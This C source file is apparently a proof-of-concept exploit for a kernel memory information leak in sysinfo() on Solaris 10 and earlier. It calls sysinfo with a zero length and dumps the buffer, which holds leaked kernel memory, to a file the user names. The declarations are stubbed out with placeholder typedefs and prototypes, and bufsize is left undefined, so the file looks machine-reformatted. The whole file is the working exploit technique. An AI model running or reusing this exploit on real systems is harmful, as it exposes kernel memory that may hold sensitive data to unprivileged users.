
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int ssize_t ;


 int O_CREAT ;
 int O_RDWR ;
 int SI_SYSNAME ;
 int bufsize ;
 int close (int) ;
 int exit (int) ;
 char* malloc (int ) ;
 int memset (char*,int ,int ) ;
 int open (char*,int,int) ;
 int printf (char*,...) ;
 int sysinfo (int ,char*,int ) ;
 int write (int,char*,int ) ;

int main(int argc,char* argv[]){
        int fd;
  ssize_t out;
        char* output_buffer;
 if(argc < 2){
  printf("[ Use with <filepath>\n");
  exit(1);
 }
        printf("[ Solaris <= 10 sysinfo() kernel memory information leak\n");
 output_buffer = malloc(bufsize);
        memset(output_buffer,0,bufsize);
        sysinfo(SI_SYSNAME,output_buffer,0);
        fd = open(argv[1],O_RDWR|O_CREAT,0700);
 if(fd!=-1){
         out = write(fd,output_buffer,bufsize);
  printf("[ Wrote %u bytes to %s\n",out,argv[1]);
         close(fd);
 }
        exit(0);
}
